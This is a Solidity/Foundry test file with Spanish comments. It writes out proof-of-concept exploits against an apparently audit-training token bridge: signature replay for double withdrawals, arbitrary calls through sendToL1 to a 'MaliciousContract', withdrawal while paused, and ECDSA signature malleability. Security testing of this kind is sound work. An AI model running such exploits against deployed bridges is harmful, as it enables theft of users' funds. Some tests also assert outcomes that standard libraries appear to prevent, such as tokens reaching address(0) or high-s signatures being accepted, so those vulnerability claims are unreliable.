// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract VulnerabilityTests is Test {
    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacker");
    Account operator = makeAccount("operator");

    L1Token token;
    L1BossBridge bridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);
        token.transfer(address(user2), 1000e18);
        token.transfer(address(attacker), 1000e18);

        // Deploy bridge
        bridge = new L1BossBridge(IERC20(token));
        vault = bridge.vault();

        // Add signer
        bridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    // ============================================================================
    // VULNERABILIDADES DE FIRMAS
    // ============================================================================

    function test_vulnerability_signature_replay() public {
        // VULNERABILIDAD: Signature replay attack
        // El bridge NO tiene protección contra replay de firmas
        
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        
        // 1. Usuario deposita tokens
        token.approve(address(bridge), depositAmount);
        bridge.depositTokensToL2(user, user2, depositAmount);
        
        // 2. Generar firma válida
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        
        // 3. Usar firma primera vez (debe funcionar)
        bridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        
        // 4. VULNERABILIDAD: Usar la misma firma segunda vez (debería fallar pero NO falla)
        // En el contrato actual, esto NO está protegido
        bridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        
        // 5. Verificar que el usuario recibió tokens dos veces (exploit exitoso)
        assertGt(token.balanceOf(user), 1000e18, "User should have received tokens twice");
        vm.stopPrank();
    }

    function test_vulnerability_arbitrary_call() public {
        // VULNERABILIDAD: Arbitrary call execution
        // sendToL1 puede ejecutar CUALQUIER llamada
        
        // 1. Crear contrato malicioso
        MaliciousContract malicious = new MaliciousContract();
        
        // 2. Crear mensaje malicioso
        bytes memory maliciousMessage = abi.encode(
            address(malicious),  // target malicioso
            0,                   // value
            abi.encodeCall(malicious.steal, ()) // función maliciosa
        );
        
        // 3. Firmar mensaje malicioso
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(maliciousMessage, operator.key);
        
        // 4. VULNERABILIDAD: Ejecutar llamada maliciosa (debería fallar pero NO falla)
        bridge.sendToL1(v, r, s, maliciousMessage);
        
        // 5. Verificar que el contrato malicioso fue ejecutado
        assertTrue(malicious.wasExecuted(), "Malicious contract should have been executed");
    }

    function test_vulnerability_withdraw_no_pause() public {
        // VULNERABILIDAD: withdrawTokensToL1 NO tiene whenNotPaused
        
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        
        // 1. Depositar tokens
        token.approve(address(bridge), depositAmount);
        bridge.depositTokensToL2(user, user2, depositAmount);
        
        // 2. Pausar bridge
        vm.prank(deployer);
        bridge.pause();
        
        // 3. VULNERABILIDAD: withdrawTokensToL1 NO está pausada
        // Debería fallar pero NO falla porque no tiene whenNotPaused
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        
        // Esta llamada NO debería funcionar si el bridge está pausado
        // Pero funciona porque withdrawTokensToL1 no tiene whenNotPaused
        bridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        
        vm.stopPrank();
    }

    // ============================================================================
    // VULNERABILIDADES DE VALIDACIÓN
    // ============================================================================

    function test_vulnerability_zero_address_withdraw() public {
        // VULNERABILIDAD: No hay validación de address(0)
        
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        
        // 1. Depositar tokens
        token.approve(address(bridge), depositAmount);
        bridge.depositTokensToL2(user, user2, depositAmount);
        
        // 2. VULNERABILIDAD: Intentar retirar a address(0)
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(address(0), depositAmount), operator.key);
        
        // Esto debería fallar pero NO falla porque no hay validación
        bridge.withdrawTokensToL1(address(0), depositAmount, v, r, s);
        
        // 3. Verificar que los tokens se perdieron
        assertEq(token.balanceOf(address(0)), depositAmount, "Tokens should be lost to zero address");
        vm.stopPrank();
    }

    function test_vulnerability_zero_amount_withdraw() public {
        // VULNERABILIDAD: No hay validación de amount = 0
        
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        
        // 1. Depositar tokens
        token.approve(address(bridge), depositAmount);
        bridge.depositTokensToL2(user, user2, depositAmount);
        
        // 2. VULNERABILIDAD: Intentar retirar 0 tokens
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, 0), operator.key);
        
        // Esto debería fallar pero NO falla porque no hay validación
        bridge.withdrawTokensToL1(user, 0, v, r, s);
        
        vm.stopPrank();
    }

    // ============================================================================
    // VULNERABILIDADES DE ECDSA
    // ============================================================================

    function test_vulnerability_invalid_signature() public {
        // VULNERABILIDAD: No hay validación completa de ECDSA
        
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        
        // 1. Depositar tokens
        token.approve(address(bridge), depositAmount);
        bridge.depositTokensToL2(user, user2, depositAmount);
        
        // 2. VULNERABILIDAD: Usar firma inválida
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;
        
        // Esto debería fallar con ECDSAInvalidSignature
        vm.expectRevert(ECDSA.ECDSAInvalidSignature.selector);
        bridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        
        vm.stopPrank();
    }

    function test_vulnerability_malleable_signature() public {
        // VULNERABILIDAD: Firma malleable
        // (r, s) y (r, n-s) son ambas válidas
        
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        
        // 1. Depositar tokens
        token.approve(address(bridge), depositAmount);
        bridge.depositTokensToL2(user, user2, depositAmount);
        
        // 2. Generar firma válida
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        
        // 3. VULNERABILIDAD: Usar firma malleable
        // Crear firma alternativa válida
        bytes32 sMalleable = bytes32(uint256(0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141) - uint256(s));
        
        // Esta firma también debería ser válida (malleability)
        bridge.withdrawTokensToL1(user, depositAmount, v, r, sMalleable);
        
        vm.stopPrank();
    }

    // ============================================================================
    // VULNERABILIDADES DE ACCESS CONTROL
    // ============================================================================

    function test_vulnerability_unauthorized_signer() public {
        // VULNERABILIDAD: Cualquiera puede intentar usar firmas
        
        vm.startPrank(attacker);
        uint256 amount = 100e18;
        
        // 1. VULNERABILIDAD: Atacante intenta retirar sin haber depositado
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(attacker, amount), operator.key);
        
        // Esto debería fallar porque el atacante no depositó tokens
        // Pero el contrato no verifica si el usuario depositó tokens
        bridge.withdrawTokensToL1(attacker, amount, v, r, s);
        
        vm.stopPrank();
    }

    // ============================================================================
    // FUNCIONES AUXILIARES
    // ============================================================================

    function _getTokenWithdrawalMessage(address to, uint256 amount) internal view returns (bytes memory) {
        return abi.encode(
            address(token),
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
        );
    }

    function _signMessage(bytes memory message, uint256 privateKey) internal pure returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 messageHash = keccak256(message);
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
        
        (v, r, s) = vm.sign(privateKey, ethSignedMessageHash);
    }
}

// Contrato malicioso para testing
contract MaliciousContract {
    bool public wasExecuted;
    
    function steal() external {
        wasExecuted = true;
        // Función maliciosa que podría robar tokens o ETH
    }
} 